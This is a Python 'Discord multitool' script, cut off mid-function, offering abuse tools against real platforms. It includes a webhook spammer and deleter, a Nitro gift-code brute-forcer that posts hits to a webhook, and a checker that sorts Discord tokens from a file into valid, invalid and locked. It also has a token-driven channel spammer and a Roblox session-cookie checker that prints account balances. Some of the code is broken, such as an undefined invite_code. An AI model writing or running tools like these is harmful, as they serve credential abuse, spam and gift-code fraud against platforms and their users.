any_error = False
try:
    import os
    from os import system
    system("title " + "Official Discord Multitool,   Made By Galactic-Kurisu#7132,   ")
except:
    pass
import webbrowser as wb
import time
import os
import random
import json
from urllib.request import Request, urlopen
import socket
try:
    import requests
    import colorama
    import pytube
    import python_percentage
except:
    any_error = True
if any_error == True:
    print("Missing Modules, Press Enter To Start Repair Process (May Not Always Work)")
    input("")
    try:
        import os
        os.system("pip install requests")
        os.system("pip install colorama")
        os.system("pip install pytube")
        os.system("pip install python-percentage")
        print("")
        print("")
        print("Problem May Be Fixed Now, Restart The Program")
        input("")
        exit()
    except:
        print("Error While Fixing")
        input("")
        exit()
#__________
def webhook_deleter():
    while True:
        try:
            webhook = input("Enter Webhook: ")
            r1 = requests.get(webhook)
            if "200" in str(r1):
                break
            else:
                print(colorama.Fore.RED + "Webhook Invalid")
        except Exception:
            print(colorama.Fore.RED + "Webhook Invalid")
    while True:
        message = input("Want To Send An Message Before Deleting Webhook (y/n): ")
        if message == "y" or message == "n":
            break
        else:
            print("Enter A Valid Choice")
    if message == "y":
        content = input("Enter Message: ")
        r2 = requests.post(webhook, json={"content": content})
        if "204" in str(r2):
            print(colorama.Fore.GREEN + "Message Sent")
        if "204" not in str(r2):
            print(colorama.Fore.RED + "Error While Sending Message")
    r = requests.delete(webhook)
    if "204" in str(r):
        print(colorama.Fore.GREEN + "Webhook Deleted")
    if "204" not in str(r):
        print(colorama.Fore.RED + "Error While Deleting Webhook")
    print("Done")
    input("")
    return
#_________
def webhook_spammer():
    while True:
        try:
            webhook = input("Enter Webhook: ")
            r_check = requests.get(webhook).json
            r_check = str(r_check)
            if "200" in r_check:
                break
            if "200" not in r_check:
                print("Webhook Invalid, Please Enter A Valid One")
        except Exception:
            print("Webhook Invalid, Please Enter A Valid One")
    content = input("Enter Message: ")
    while True:
        avatar_y_n = input("Want An Avatar (y/n): ")
        if avatar_y_n == "n" or avatar_y_n == "y":
            break
        else:
            print("Enter A Valid Choice")
    if avatar_y_n == "y":
        while True:
            avatar_url = input("Enter Avatar Url: ")
            if "http://" in avatar_url or "https://" in avatar_url:
                break
            else:
                print("Enter A Valid Choice")
    if avatar_y_n == "n":
        avatar_url = ""
    username = input("Enter Bot Username: ")
    while True:
        limit = input("Enter Limit (i for infinity): ")
        if limit == "i" or limit == "I":
            break
        try:
            limit = int(limit)
            break
        except Exception:
            print("Enter A Valid Choice")
    if limit == "i" or limit == "I":
        limit = str(limit)
        
    done = 0
    while True:
        limit = str(limit)
        r = requests.post(webhook, json={"avatar_url": avatar_url, "username": username, "content": content})
        r = str(r)
        if "i" not in str(limit) and "204" in r:
            done = int(done) + 1
        if "i" in limit or "I" in limit:
            done == ""
        if "204" in r:
            if "i" not in limit and "I" not in limit:
                print(colorama.Fore.GREEN + f"Message Succsesfully Sent ({done})")
            if "i" in limit or "I" in limit:
                print(colorama.Fore.GREEN + "Message Succsesfully Sent")
        if "204" not in r:
            print(colorama.Fore.GREEN + "Rate Limited, Retrying...")
        try:
            if int(done) == int(limit):
                print("Done")
                input("")
                return
        except Exception:
            pass
#__________________
def ip_checker():
    ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    print(f"Your Ip Is {ip}")
    input("")
    return
#___________
def credits():
    print("This Program Was Coded By Galactic-Kurisu#7132")
    print("You Can Type i Before The Number Like i1, I1, I 1, i 1 (i=info, if y do it then it will show what program do")
    print("Its On Version " + str(version))
    print("Please Do Not Change Credits")
    print("This Tool Is Free So If You Payed For It, RIP")
    print("My Github Account Link Is: https://github.com/Galactic-Kurisu")
    input("")
    return 
#___________
def private_screenshot_gen():
    input("Press Enter To Start: ")
    choice = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
    while True:
        AS = random.randint(1000, 9999)
        main1 = random.choice(choice)
        main2 = random.choice(choice)
        wb.open(f"https://prnt.sc/{main1}{main2}{AS}")
        main2 = input("Press Enter For Next Picture And Exit To Go Back: ")
        if main2 == "exit" or main2 == "Exit" or main2 == "EXIT":
            return
#_________ 
def nitro_gen():
    print("""What Type?
    1. https://discord.gift/(CODE)
    2. (CODE)
    3. discord.gift/(CODE)
    4. Custom(CODE)""")
    while True:
        main = input("> ")
        if main == "1" or main == "2" or main == "3" or main == "4":
            break
        else:
            print("Enter A Valid Choice")
    if main == "4":
        custom = input("Enter What You Want Before The Code: ")
    while True:
        try:
            main2 = input("How Manny Codes Do You Wanna Generate: ")
            main2 = int(main2)
            main2 = str(main2)
            break
        except Exception:
            print("Enter A Valid Choice")
    while True:
        auto_check = input("Do You Wanna Auto Check The Codes, y/n: ")
        if auto_check == "y" or auto_check == "n":
            break
        else:
            print("Enter A Valid Choice")
    if auto_check == "y":
            while True:
                auto_webhook = input("Wanna Send Valid Codes To An Webhook (y/n): ")
                if auto_webhook == "n" or auto_webhook == "y":
                    break
                else:
                    print("Enter A Valid Choice")
            if auto_webhook == "n":
                pass
            if auto_webhook == "y":
                while True:
                    try:
                        webhook = input("Enter Webhook: ")
                        r4 = requests.get(webhook)
                        if "200" in str(r4):
                            break
                        if "200" not in str(r4):
                            print("Webhook Invalid")
                    except Exception:
                        print("Webhook Invalid")
    while True:
        try:
            delay = input("Enter Delay (0 For None): ")
            delay = int(delay)
            delay = str(delay)
            break
        except Exception:
            print("Enter A Valid Choice")
    
    while True:
        save = input("Wanna Save Codes In A Txt File (y/n): ")
        if save == "y" or save == "n":
            break
        else:
            print("Enter A Valid Choice")
    if auto_check == "y":
        while True:
            y_n = input("""Do You Wanna See When Its Invalid Or Only When Its Valid
        1. Only Valid
        2. Invalid And Valid
        """)
            if y_n == "1" or y_n == "2":
                break
            else:
                print("Enter Valid Choice")
    limit = int(main2)
    generated = 0
    choices = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
    while True: 
        number1 = random.choice(choices)
        number2 = random.choice(choices)
        number3 = random.choice(choices)
        number4 = random.choice(choices)
        number5 = random.choice(choices)
        number6 = random.choice(choices)
        number7 = random.choice(choices)
        number8 = random.choice(choices)
        number9 = random.choice(choices)
        number10 = random.choice(choices)
        number11 = random.choice(choices)
        number12 = random.choice(choices)
        number13 = random.choice(choices)
        number14 = random.choice(choices)
        number15 = random.choice(choices)
        number16 = random.choice(choices)
        time.sleep(float(delay))
        code_to_check = f"{number1}{number2}{number3}{number4}{number5}{number6}{number7}{number8}{number9}{number10}{number11}{number12}{number13}{number14}{number15}{number16}"
        if main == "1":
            print(f"https://discord.gift/{number1}{number2}{number3}{number4}{number5}{number6}{number7}{number8}{number9}{number10}{number11}{number12}{number13}{number14}{number15}{number16}")
            if save == "y":
                file = open("invalid_nitro.txt", "a")
                file.write(f"https://discord.gift/{code_to_check}\n")
                file.close()
        if main == "2":
            print(f"{number1}{number2}{number3}{number4}{number5}{number6}{number7}{number8}{number9}{number10}{number11}{number12}{number13}{number14}{number15}{number16}")
            if save == "y":
                file = open("invalid_nitro.txt", "a")
                file.write(f"{code_to_check}\n")
                file.close()
        if main == "3":
            print(f"discord.gift/{number1}{number2}{number3}{number4}{number5}{number6}{number7}{number8}{number9}{number10}{number11}{number12}{number13}{number14}{number15}{number16}")
            if save == "y":
                file = open("invalid_nitro.txt", "a")
                file.write(f"discord.gift/{code_to_check}\n")
                file.close()
        if main == "4":
            print(f"{custom}{number1}{number2}{number3}{number4}{number5}{number6}{number7}{number8}{number9}{number10}{number11}{number12}{number13}{number14}{number15}{number16}")
            if save == "y":
                file = open("invalid_nitro.txt", "a")
                file.write(f"{custom}{code_to_check}\n")
                file.close()
        generated = int(generated) + 1
        if auto_check == "y":
            checker = "https://discordapp.com/api/v6/entitlements/gift-codes/" + code_to_check + "?with_application=false&with_subscription_plan=true"
            response = requests.get(checker)
            if "200" not in response:
                if y_n == "1":
                    pass
                if y_n == "2":
                    print("Code Invalid")
            if "200" in response:
                if auto_webhook == "y":
                    if main == "2":
                        requests.post(webhook, json={"username": "Nitro Gen", "content": f"**@everyone Here Is Your Valid Nitro Code:** `{code_to_check}`"})
                    if main == "1":
                        requests.post(webhook, json={"username": "Nitro Gen", "content": f"**@everyone Here Is Your Valid Nitro Code:** `https://discord.gift/{code_to_check}`"})
                    if main == "3":
                        requests.post(webhook, json={"username": "Nitro Gen", "content": f"**@everyone Here Is Your Valid Nitro Code:** `discord.gift/{code_to_check}`"})
                    if main == "3":
                        requests.post(webhook, json={"username": "Nitro Gen", "content": f"**@everyone Here Is Your Valid Nitro Code:** `{custom}{code_to_check}`"})
                if auto_webhook == "n":
                    pass
                print("Code Valid!")
                if main == "1":
                    print(f"Here Is Your Valid Code: https://discord.gift/{code_to_check}")
                    input("Press Enter To Go Back")
                    if save == "y":
                        file = open("valid_nitro.txt", "a")
                        file.write(f"https://discord.gift/{code_to_check}\n")
                        file.close()
                    return
                if main == "2":
                    print(f"Here Is Your Valid Code: {code_to_check}")
                    input("Press Enter To Go Back")
                    if save == "y":
                        file = open("valid_nitro.txt", "a")
                        file.write(f"{code_to_check}\n")
                        file.close()
                    return
                if main == "3":
                    print(f"Here Is Your Valid Code: discord.gift/{code_to_check}", "a")
                    input("Press Enter To Go Back")
                    if save == "y":
                        file = open("valid_nitro.txt")
                        file.write(f"discord.gift/{code_to_check}\n")
                        file.close()
                    return
                if main == "4":
                    print(f"Here Is Your Valid Code: {custom}{code_to_check}", "a")
                    input("Press Enter To Go Back")
                    if save == "y":
                        file = open("valid_nitro.txt")
                        file.write(f"{custom}{code_to_check}\n")
                        file.close()
                    return
        if auto_check == "n":
            pass
        if generated == limit:
            print("Done")
            input("")
            return
#_____________
def webhook_checker():
    while True:
            try:
                webhook = input("Enter Webhook: ")
                r_check = requests.get(webhook).json
                r_check = str(r_check)
                if "200" in r_check:
                    print("Webhook Valid")
                    main = input("Wanna Check Another Webhook (y/n): ")
                    if main == "y":
                        pass
                    if main == "n":
                        return
                if "200" not in r_check:
                    print("Webhook Invalid")
                    main = input("Wanna Check Another Webhook (y/n): ")
                    if main == "y":
                        pass
                    if main == "n":
                        return
            except Exception:
                print("Webhook Invalid")
                main = input("Wanna Check Another Webhook (y/n): ")
                if main == "y":
                    pass
                if main == "n":
                    return
#_________
def roblox_giftcard_gen():
    while True:
        try:
            main = input("Enter How Manny Codes You Wanna Generate: ")
            main = int(main)
            main = str(main)
            break
        except Exception:
            print("Enter A Valid Choice")
    while True:
        try:
            delay = input("Enter Delay (0 For None): ")
            delay = int(delay)
            delay = str(delay)
            break
        except Exception:
            print("Enter A Valid Choice")
    while True:
        save = input("Wanna Save Codes In A Txt File (y/n): ")
        if save == "y" or save == "n":
            break
        else:
            print("Enter Valid Choice")
    choices = ["1", "2", "3", "4", "5", "6", "7", "8", "9"]
    numba = 0
    limit = int(main)
    while True:
        numba1 = random.choice(choices)
        numba2 = random.choice(choices)
        numba3 = random.choice(choices)
        numba4 = random.choice(choices)
        numba5 = random.choice(choices)
        numba6 = random.choice(choices)
        numba7 = random.choice(choices)
        numba8 = random.choice(choices)
        numba9 = random.choice(choices)
        time.sleep(float(delay))
        code_save = f"{numba1}{numba2}{numba3}{numba4}{numba5}{numba6}{numba7}{numba8}{numba9}"
        print(f"{numba1}{numba2}{numba3}{numba4}{numba5}{numba6}{numba7}{numba8}{numba9}")
        numba = int(numba) + 1
        if numba == limit:
            print("Done")
            input("")
            return
        if save == "y":
            the_file = open("roblox_codes.txt", "a")
            the_file.write(f"{int(code_save)}\n")
            the_file.close()
#________
def token_checker():
    main = input("""
    1. Check 1 Token
    2. Check Tokens In tokens.txt
    > """)
    if main == "2":
        colorama.init(autoreset=True)
        try:
            donetokenlist = []
            print("Loading Tokens...")
            tokens = open("tokens.txt", "r")
            tokenlist = tokens.readlines()
            tokens.close()
            loaded_amount = 0
            for token in tokenlist:
                donetokenlist.append(token[:-1])
                loaded_amount = int(loaded_amount) + 1
            print(str(loaded_amount) + " Tokens Loaded, Press Enter To Start")
            input("")
        except Exception:
            print("Unable To Find tokens.txt")
            input("")
            return
        validtokens = []
        invalidtokens = []
        lockedtokens = []
        totaltoken = 0
        validtoken = 0
        lockedtoken = 0
        invalidtoken = 0
        for token in donetokenlist:
            while True:
                r1 = requests.get('https://discord.com/api/v6/auth/login', headers={"Authorization": token})
                r1 = str(r1)
                if "429" not in r1:
                    break
                if "429" in r1:
                    print(colorama.Fore.YELLOW + "Ratelimited, Retrying")
            r1 = str(r1)
            totaltoken = int(totaltoken) + 1
            if "400" in r1:
                print(colorama.Fore.RED + "Token Invalid")
                invalidtokens.append(token)
                invalidfile = open("invalid_tokens.txt", "a")
                invalidfile.writelines(token+"\n")
                invalidfile.close()
                invalidtoken = int(invalidtoken) + 1
            if "200" in r1:
                while True:
                    r = requests.get(f'https://discord.com/api/v6/invite/{invite_code}', headers={"Authorization": token})
                    r = str(r)
                    if "429" not in r:
                        break
                    if "429" in r:
                        print(colorama.Fore.YELLOW + "Ratelimited, Retrying")
                r = str(r)
                if "200" in r:
                    print(colorama.Fore.GREEN + "Token Valid")
                    validtokens.append(token)
                    validfile = open("valid_tokens.txt", "a")
                    validfile.writelines(token+"\n")
                    validfile.close()
                    validtoken = int(validtoken) + 1
                if "403" in r:
                    print(colorama.Fore.RED + "Token Locked")
                    lockedtokens.append(token)
                    lockedfile = open("locked_tokens.txt", "a")
                    lockedfile.writelines(token+"\n")
                    lockedfile.close()
                    lockedtoken = int(lockedtoken) + 1
        print("\n\nStats:\n")
        print("Total Checked: " + str(totaltoken))
        print("Total Valid: " +  str(validtoken))
        print("Total Invalid: " +  str(invalidtoken))
        print("Total Locked: " +  str(lockedtoken))
        input("")
        return
    if main == "1":
        while True:
            tokens = input("Enter Token: ")
            r1 = requests.get('https://discord.com/api/v6/auth/login', headers={"Authorization": tokens})
            if "200" not in str(r1):
                print(colorama.Fore.RED + "Invalid")
            if "200" in str(r1):
                r = requests.get(f'https://discord.com/api/v6/invite/{invite_code}', headers={"Authorization": tokens})
                if "200" in str(r):
                    print(colorama.Fore.GREEN + "Valid")
                if "403" in str(r):
                    print(colorama.Fore.YELLOW + "Locked")
            main = input("Wanna Check Another Token, y/n: ")
            if main == "n":
                return
            if main == "y":
                pass
#_________
def proxy_gen():
    print("""
    1. Http
    2. Https
    3. Socks4
    4. Socks5""")
    while True:
        type = input("")
        if type == "1" or type == "2" or type == "3" or type == "4":
            break
        else:
            print("Enter A Valid Choice")

    while True:
        try:
            ms = input("Enter Delay (50-10000, Lower = Less Proxies): ")
            ms = int(ms)
            if ms < 10001 and ms > 49:
                break
            else:
                print("Enter A Valid Choie")
        except Exception:
            print("Enter A Valid Choice")
    try:
        if type == "1":
            r = requests.get(f"https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout={ms}&country=all").text
        if type == "2":
            r = requests.get(f"https://api.proxyscrape.com/v2/?request=getproxies&protocol=https&timeout={ms}&country=all").text
        if type == "3":
            r = requests.get(f"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout={ms}&country=all").text
        if type == "4":
            r = requests.get(f"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout={ms}&country=all").text
        while True:
            save = input("""Pick One
    1. Save In A Txt File
    2. Only Print Proxies
    3. Both
    """)
            if save == "1" or save == "2":
                break
            else:
                print("Enter A Valid Choice")
        if save == "1" or save == "3":
            file = open("proxies.txt", "a")
            file.write(str(r))
            file.close()
        if save == "2" or save == "3":
            print(str(r))
        print("Done")
        input("")
    except Exception:
        print("Error While Getting Proxies")
        input("")
        return
#______
def feedback():
    print("not working atm")
    input("")
    return
#_______
def cookie_gen():
    while True:
        try:
            main = input("Enter How Many Cookies You Wanna Generate: ")
            main = int(main)
            main = str(main)
            break
        except Exception:
            print("Enter A Valid Choice")
    print("Generating, Please Be Patient")
    limit = int(main)
    done = 0
    choices = "ABCDEF123456789"
    while True:
        numba1 = random.choices(choices, k=732)
        file = open("cookie.txt", "a")
        file.write("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")
        file.write(''.join(numba1))
        file = open("cookie.txt", "a")
        file.write("\n")
        file.close()
        done = int(done) + 1
        print(f"{done} Cookie(s) Have Been Generated")
        if done == limit:
            print("Done")
            input("")
            return
#_______
def cookie_checker():
    cookie = input("Enter Roblox Cookie: ")
    try:
        r = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": cookie}).json()
        print("Cookie Is Valid")
        try:
            print("Acount User Id: " +  str(r["UserID"]))
        except Exception:
            print("Acount User Id: ERROR")
        try:
            print("Acount Username: " +  str(r["UserName"]))
        except Exception:
            print("Acount Username: ERROR")
        try:    
            print("Robux Balance: " +  str(r["RobuxBalance"]))
        except Exception:
            print("Robux Balance: ERROR")
        try:    
            print("Account Picture: " +  str(r["ThumbnailUrl"]))
        except Exception:
            print("Account Picture: ERROR")
        try:    
            print("Builders Club Member: " +  str(r["IsAnyBuildersClubMember"]))
        except Exception:
            print("Builders Club Member: ERROR")
        try:    
            print("Premium: " +  str(r["IsPremium"]))
        except Exception:
            print("Premium: ERROR")
        while True:
            save = input("Wanna Save Info In A Txt File (y/n): ")
            if save == "y" or save == "n":
                break
            else:
                print("Enter A Valid Choice")
        if save == "y":
            file = open(str(r["UserName"])+".txt", "a")
            try:
                file.write("Acount User Id: " +  str(r["UserID"]) + "\n")
            except Exception:
                file.write("Acount User Id: ERROR" + "\n")
            try:
                file.write("Acount Username: " +  str(r["UserName"]) + "\n")
            except Exception:
                file.write("Acount Username: ERROR" + "\n")
            try:    
                file.write("Robux Balance: " +  str(r["RobuxBalance"]) + "\n")
            except Exception:
                file.write("Robux Balance: ERROR" + "\n")
            try:    
                file.write("Account Picture: " +  str(r["ThumbnailUrl"]) + "\n")
            except Exception:
                file.write("Account Picture: ERROR" + "\n")
            try:    
                file.write("Builders Club Member: " +  str(r["IsAnyBuildersClubMember"]) + "\n")
            except Exception:
                file.write("Builders Club Member: ERROR" + "\n")
            try:    
                file.write("Premium: " +  str(r["IsPremium"]) + "\n")
            except Exception:
                file.write("Premium: ERROR" + "\n")
            file.close()
            print("Succsesfully Saved")
            input("")
    except Exception:
        print("Cookie Invalid")
        input("")
#_________
def token_spammer():
    try:    
        while True:
            token = input("Enter Token: ")
            r1 = requests.get('https://discord.com/api/v6/auth/login', headers={"Authorization": token})
            if "200" not in str(r1):
                print("Token Invalid")
            if "200" in str(r1):
                r = requests.get(f'https://discord.com/api/v6/invite/{invite_code}', headers={"Authorization": token})
                if "200" in str(r):
                    break
                if "403" in str(r):
                    print("Token Locked")
        while True:
            try:
                channel_id = input("Enter Channel Id: ")
                channel_id = int(channel_id)
                channel_id = str(channel_id)
                break
            except Exception:
                print("Channel Id Was Invalid")
        message = input("Enter Message To Send: ")
        while True:
            try:
                delay = input("Enter Delay (1-2 Recomended, 0 For None): ")
                delay = int(delay)
                delay = str(delay)
                break
            except Exception:
                print("Enter A Valid Delay")
        while True:
            try:
                amount = input("Enter How Many Messages You Wanna Send: ")
                amount = int(amount)
                amount = str(amount)
                break
            except Exception:
                print("Enter A Valid Amount")
        while True:
            main = input("Do You Want Random Number At End (y/n): ")
            if main == "y" or main == "n":
                break
            else:
                print("Enter A Valid Choice")
        limit = int(amount)
        done = 0
        if main == "n":
            while True:
                payload = {
                    "content": f"{message}"
                }
                header = {
                    "authorization": f"{token}"
                }
                r = requests.post(f"https://discord.com/api/v8/channels/{channel_id}/messages", data=payload, headers=header)
                r = str(r)
                if "200" in str(r):
                    print("Message Sent")
                if "200" not in str(r):
                    print("Message Did Not Send")
                done = int(done) + 1
                if done == limit:
                    print("Done")
                    input("")
                    return
                time.sleep(float(delay))
        if main == "y":
            while True:
                random34 = random.randint(1000, 9999)
                payload = {
                    "content": f"{message}   {random34}"
                }
                header = {
                    "authorization": f"{token}"
                }
                r = requests.post(f"https://discord.com/api/v8/channels/{channel_id}/messages", data=payload, headers=header)
                r = str(r)
                if "200" in r:
                    print("Message Sent")
                if "200" not in r:
                    print("Message Did Not Send")
                done = int(done) + 1
                if done == limit:
                    print("Done")
                    input("")
                    return
                time.sleep(float(delay))
    except Exception:
        print("Channel Id Was Invalid, To Late In Process To Pick New Id, Press Enter To Go Back")
        input("")
        return
#________
def channel_scraper():
    print("Empty")
    input("")
#_______
def account_letter_sniper():
    print("Its An Better Version On My Github, It Support Threads, 3 Letter Usernames, 4 Letter Usernames, Look In Number 3 For My Github Account")
    while True:
        main = input("How Manny 5 Roblox Letter Account Names Do You Find: ")
        try:
            main = int(main)
            break
        except Exception:
            print("Enter A Number")
    while True:
        main2 = input("Wanna Save Working Names In A Txt File (y/n): ")
        if main2 == "y" or main2 == "n":
            break
        else:
            print("Enter A Valid Choice")
    limit = float(main)
    done2 = "0"
    done = int(done2)
    if main == "0":
        print("Ok")
        input("")
        return 
    choices = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
    while not done == limit: 
        random1 = random.choice(choices)
        random2 = random.choice(choices)
        random3 = random.choice(choices)
        random4 = random.choice(choices)
        random5 = random.choice(choices)
        r = requests.get(f'https://auth.roblox.com/v1/usernames/validate?request.username={random1}{random2}{random3}{random4}{random5}&request.birthday=1337-04-20').json()
        r = str(r)
        if "0" in r:
            done = done + 1
            print(f"{done} Account Have Been Generated, Name: " + random1 + random2 + random3 + random4 + random5)
            if main2 == "y":
                file = open("roblox_names.txt", "a")
                file.write(f"{random1}{random2}{random3}{random4}{random5}\n")
                file.close()
        else:
            print("Account Alredy Used, Generating New...")
    print("Done")
    input("")
    return
#_____
def webhook_info():
    while True:
        try:
            webhook = input("Enter Webhook: ")
            r_check = requests.get(webhook).json
            r_check = str(r_check)
            if "200" in r_check:
                break
            if "200" not in r_check:
                print("Webhook Invalid, Please Enter A Valid One")
        except Exception:
            print("Webhook Invalid, Please Enter A Valid One")
    r = requests.get(webhook)
    r = r.json()
    print("Webhook Name: " + r["name"])
    print("Has Avatar: " + str(r["avatar"]))
    print("Channel Id: " + r["channel_id"])
    print("Guild Id: " + r["guild_id"])
    print("Webhook Token: " + r["token"])
    print("Press Enter To Go Back")
    input("")
    return
#__________
def ip_info():
    try:
        ip = input("Enter Ip: ")
        print("Getting IP Info, Could Take Sum Time So Be Patient")
        r = requests.get(f"http://ip-api.com/json/{ip}")
        r = r.json()
        print("\n\n")
        print("Country: " + r["country"])
        print("Country Code: " + r["countryCode"])
        print("Region Name: " + r["regionName"])
        print("City: " + r["city"])
        print("Zip Code: " + r["zip"])
        print("Lat: " + str(r["lat"]))
        print("Lon: " + str(r["lon"]))
        print("Timezone: " + r["timezone"])
        print("ISP: " + r["isp"])
        print("Org: " + r["org"])
        print("AS: " + r["as"])
        print("\n\n")
        while True:
            save = input("Wanna Save All Info In A Txt File (y/n): ")
            if save == "y" or save == "n":
                break
            else:
                print("Enter A Valid Choice")
        if save == "y":
            file = open(f"ip_info_{ip}.txt", "a")
            file.write("\n")
            file.write("Country: " + r["country"])
            file.write("\n")
            file.write("Country Code: " + r["countryCode"])
            file.write("\n")
            file.write("Region Name: " + r["regionName"])
            file.write("\n")
            file.write("City: " + r["city"])
            file.write("\n")
            file.write("Zip Code: " + r["zip"])
            file.write("\n")
            file.write("Lat: " + str(r["lat"]))
            file.write("\n")
            file.write("Lon: " + str(r["lon"]))
            file.write("\n")
            file.write("Timezone: " + r["timezone"])
            file.write("\n")
            file.write("ISP: " + r["isp"])
            file.write("\n")
            file.write("Org: " + r["org"])
            file.write("\n")
            file.write("AS: " + r["as"])
            file.write("\n")
            file.close()
            print("Succsesfully Saved Info")
        return
    except Exception:
        print("Ip Invalid, Press Enter To Go Back To Main Meny")
        input("")
        return
#____
def tikokt_sniper():
    choices = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
    
    while True:
        letter = input("""Pick One
1. 5 Letter
2. 4 Letter
3. 3 Letter
> """)
        if letter == "1" or letter == "2" or letter == "3":
            break
        else:
            print("Enter A Valid Choice")
    if letter == "1":
        while True:
            try:
                limit = input("Enter How Many Names You Wanna Find: ")
                limit = int(limit)
                limit = str(limit)
                break
            except Exception:
                print("Enter A Number")
        limit = int(limit)
        done = 0
        valid = 0
        invalid = 0
        total = 0
        while True:
            save = input("Wanna Save Names In An Txt File (y/n): ")
            if save == "y" or save == "n":
                break
            else:
                print("Enter A Valid Choice")
        while True:
            random1 = random.choice(choices)
            random2 = random.choice(choices)
            random3 = random.choice(choices)
            random4 = random.choice(choices)
            random5 = random.choice(choices)
            r = requests.session().head(f"https://www.tiktok.com/@{random1}{random2}{random3}{random4}{random5}")
            r = str(r)
            if "200" in r:
                print("Username Taken, Generating New...")
                invalid = invalid + 1
                total = total + 1
            if "404" in r:
                done = done + 1
                print(f"Done With {done}/{limit}, Username Not Taken/Banned, Username: {random1}{random2}{random3}{random4}{random5}")
                valid = valid + 1
                total = total + 1
                if save == "y":
                    file = open("tiktok_names.txt", "a")
                    file.write(f"{random1}{random2}{random3}{random4}{random5}\n")
                    file.close()
                if done == limit:
                    print(f"Done, Total Checked: {total}, Total Valid: {valid}, Total Invalid: {invalid}")
                    input("")
                    return
    if letter == "2":
        while True:
            try:
                limit = input("Enter How Many Names You Wanna Find: ")
                limit = int(limit)
                limit = str(limit)
                break
            except Exception:
                print("Enter A Number")
        limit = int(limit)
        done = 0
        valid = 0
        invalid = 0
        total = 0
        while True:
            save = input("Wanna Save Names In An Txt File (y/n): ")
            if save == "y" or save == "n":
                break
            else:
                print("Enter A Valid Choice")
        while True:
            random1 = random.choice(choices)
            random2 = random.choice(choices)
            random3 = random.choice(choices)
            random4 = random.choice(choices)
            random5 = random.choice(choices)
            r = requests.session().head(f"https://www.tiktok.com/@{random1}{random2}{random3}{random4}")
            r = str(r)
            if "200" in r:
                print("Username Taken, Generating New...")
                invalid = invalid + 1
                total = total + 1
            if "404" in r:
                done = done + 1
                print(f"Done With {done}/{limit}, Username Not Taken/Banned, Username: {random1}{random2}{random3}{random4}")
                valid = valid + 1
                total = total + 1
                if save == "y":
                    file = open("tiktok_names.txt", "a")
                    file.write(f"{random1}{random2}{random3}{random4}\n")
                    file.close()
                if done == limit:
                    print(f"Done, Total Checked: {total}, Total Valid: {valid}, Total Invalid: {invalid}")
                    input("")
                    return
    if letter == "3":
        while True:
            try:
                limit = input("Enter How Many Names You Wanna Find: ")
                limit = int(limit)
                limit = str(limit)
                break
            except Exception:
                print("Enter A Number")
        limit = int(limit)
        done = 0
        valid = 0
        invalid = 0
        total = 0
        while True:
            save = input("Wanna Save Names In An Txt File (y/n): ")
            if save == "y" or save == "n":
                break
            else:
                print("Enter A Valid Choice")
        while True:
            random1 = random.choice(choices)
            random2 = random.choice(choices)
            random3 = random.choice(choices)
            random4 = random.choice(choices)
            random5 = random.choice(choices)
            r = requests.session().head(f"https://www.tiktok.com/@{random1}{random2}{random3}")
            r = str(r)
            if "200" in r:
                print("Username Taken, Generating New...")
                invalid = invalid + 1
                total = total + 1
            if "404" in r:
                done = done + 1
                print(f"Done With {done}/{limit}, Username Not Taken/Banned, Username: {random1}{random2}{random3}")
                valid = valid + 1
                total = total + 1
                if save == "y":
                    file = open("tiktok_names.txt", "a")
                    file.write(f"{random1}{random2}{random3}\n")
                    file.close()
                if done == limit:
                    print(f"Done, Total Checked: {total}, Total Valid: {valid}, Total Invalid: {invalid}")
                    input("")
                    return
#_____
def discord_invite_sniper():
    print(colorama.Fore.YELLOW + "THIS WILL TAKE A LONG TIME")
    while True:
        limit = input("Enter How Manny Invites You Wanna Generate: ")
        try:
            limit = int(limit)
            break
        except Exception:
            print("Enter A Number")
        
    while True:
        save = input("Wanna Save Valid Invites In A Txt File (y/n): ")
        if save == "y":
            break
        if save == "n":
            break
        else:
            print("Enter y Or n")
    webhook_save = input("Wanna Send Working Codes To An Webhook (y/n): ")
    if webhook_save == "y":
        while True:
            try:
                webhook = input("Enter Webhook: ")
                r_check = requests.get(webhook).json
                r_check = str(r_check)
                if "200" in r_check:
                    break
                if "200" not in r_check:
                    print("Webhook Invalid, Please Enter A Valid One")
            except Exception:
                print("Webhook Invalid, Please Enter A Valid One")
    choice = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
    tryes = 0
    worked = 0
    invalid = 0
    while True:
        r1 = random.choice(choice)
        r2 = random.choice(choice)
        r3 = random.choice(choice)
        r4 = random.choice(choice)
        r5 = random.choice(choice)
